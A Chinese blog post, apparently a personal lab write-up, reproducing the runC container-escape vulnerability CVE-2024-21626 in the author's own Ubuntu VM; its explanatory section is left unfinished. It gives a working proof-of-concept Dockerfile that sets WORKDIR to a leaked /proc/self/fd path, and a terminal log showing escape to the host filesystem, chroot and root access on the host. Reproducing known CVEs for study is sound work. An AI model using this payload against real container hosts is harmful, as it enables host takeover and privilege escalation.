---
title: CVE-2024-21626
date: 2025-03-03 18:27:00
tags: [Web, 渗透]
categories: 渗透
---

研究一下 Docker 的 CVE。

<!--more-->

## 前置知识

### 什么是 Docker

相信读这篇文章的大部分人都知道 Docker 是什么，但不一定能背出这种八股问题。
Deepseek 给出的回答是：Docker 是一种开源的容器化平台，用于快速构建、打包、部署和运行应用程序。它的核心思想是通过容器技术，将应用及其依赖环境（如库、配置等）打包成一个轻量级、可移植的镜像，从而实现 **“一次构建，处处运行”**。

### 什么是 runC

runC 是一个开源的容器运行时，是 Docker 的一部分，用于创建和运行容器。runC 是一个轻量级的工具，它实现了 [OCI](https://opencontainers.org/) 标准，可以在任何 OCI 兼容的容器运行时中使用。

## 复现

用 WSL 一直复现不出来，WSL 的情况很奇怪，`docker version` 能看到版本是老的，但是直接执行 `runc` 又没有这条命令。
实在不行了，换 VMWare 里搞搞
新建了个 Ubuntu 20.04 的虚拟机，选择 Minimal Installation，不要浏览器之类乱七八糟的东西。
学校内网有镜像站，直接换个源起飞。

```bash
sudo rm /etc/apt/sources.list   # 要备份就 mv 一下，因为我是新机，就直接删了
sudo nano /etc/apt/sources.list
```

粘贴后 `Ctrl + O` 保存，`Ctrl + X` 退出。

```bash
sudo apt update
sudo apt upgrade
```

这里默认没带 SSH，执行 `sudo apt install openssh-server` 装一下。不然不太习惯 Ubuntu 自带的终端。
然后安装 Docker

```bash
sudo apt install docker.io
```

`docker version` 看一下版本，runc 是新的，还是得自己编译老版本替换。

```bash
git clone https://github.com/opencontainers/runc
cd runc
git checkout v1.1.0-rc.1
sudo apt install -y build-essential libseccomp-dev   # 不然会报错
make
sudo rm -rf $(which runc)
sudo make install
sudo systemctl restart docker
```

这个新机 make 和 go 都没有，中途也装了一下，不提。
写一个 Dockerfile 如下：

```Dockerfile
FROM ubuntu
 
# Sets the current working directory for this image
WORKDIR /proc/self/fd/7/
```

执行 `docker build . -t test`，这里 `-t` 的意思是 tag。
再执行 `docker run --rm -it test bash`，这里 `--rm` 可以让容器停止后自动删除容器文件系统，避免手动清理临时容器，一般用于测试，`-it bash` 意思是起一个交互式的 bash shell。
说是可能要多执行几次才会成功，但是执行了几十次都不行，把 Dockerfile 的 `WORKDIR` 改成 `WORKDIR /proc/self/fd/8/` 就可以了。

OHHHHHHHHH!!!!!!!!!
以下是命令执行记录：

```bash
kali@cverc:~/cve-2024-21626$ sudo docker run --rm -it test bash
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
root@6e9ec0c97b8f:.# cd ../..
chdir: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
root@6e9ec0c97b8f:../..# ls
block  bus  class  dev  devices  firmware  fs  hypervisor  kernel  module  power
root@6e9ec0c97b8f:../..# pwd
../..
root@6e9ec0c97b8f:../..# cd ..
root@6e9ec0c97b8f:../../..# ls /
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@6e9ec0c97b8f:../../..# ls /home
ubuntu
root@6e9ec0c97b8f:../../..# docker ps
bash: docker: command not found
root@6e9ec0c97b8f:../../..# chroot .
# ls
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  swapfile  tmp  var
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   sys       usr
# docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED         STATUS         PORTS     NAMES
6e9ec0c97b8f   test      "bash"    4 minutes ago   Up 4 minutes             admiring_gates
# whoami
root
# exit
root@6e9ec0c97b8f:../../..# exit
exit
kali@cverc:~/cve-2024-21626$ sudo docker run --rm -it test
[sudo] password for kali:
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
root@21b173949eee:.# exit
exit
kali@cverc:~/cve-2024-21626$ sudo docker run --rm -it test bash
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
root@d5e014a9425b:.#
```

这里简单提下，`chroot` 是改变根目录的命令，`chroot .` 就是把当前目录作为根目录，这样操作起来就跟宿主机一样了。

## 原理

// TO be continued

## 参考

<https://nitroc.org/posts/cve-2024-21626-illustrated/#%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E9%95%9C%E5%83%8F%E5%AE%9E%E7%8E%B0%E5%88%A9%E7%94%A8>
<https://www.manjusaka.blog/posts/2024/02/10/CVE-2024-21626/index.html>
